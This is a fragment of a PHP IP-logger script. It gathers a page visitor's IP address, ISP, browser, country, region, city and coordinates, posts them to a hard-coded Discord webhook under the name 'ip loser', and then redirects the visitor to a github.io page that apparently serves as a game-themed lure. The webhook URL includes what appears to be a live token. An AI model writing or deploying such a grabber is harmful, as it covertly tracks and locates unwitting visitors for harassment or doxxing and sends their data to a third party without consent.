...
//Variables
$Webhook    = "https://discord.com/api/webhooks/1237451216116645960/HjCWcw_IpjmxgCHy7N44EJVkS9B6PRb-XAQD1S7YLBHFi1xK0-0Ozgzz9Fk9OLYuPnuW"; //Webhook here.

$WebhookTag = "ip loser"; //This will be the name of the webhook when it sends a message.  

//JS we are going to send to the webhook.
$JS = array(
    'username'   => "$WebhookTag - 💀" , 
    'avatar_url' => "https://i.kym-cdn.com/photos/images/original/002/192/146/cc2.jpg",
    'content'    => "**__IP Info__**:\nIP: $IP\nISP: $ISP\nBrowser: $Browser\n**__Location__**: \nCountry: $Country\nRegion: $Region\nCity: $City\nCoordinates: $COORD"
);
...
header("Location: https://pins-gold.brawlstarsc.github.io/iploser.html");
?>
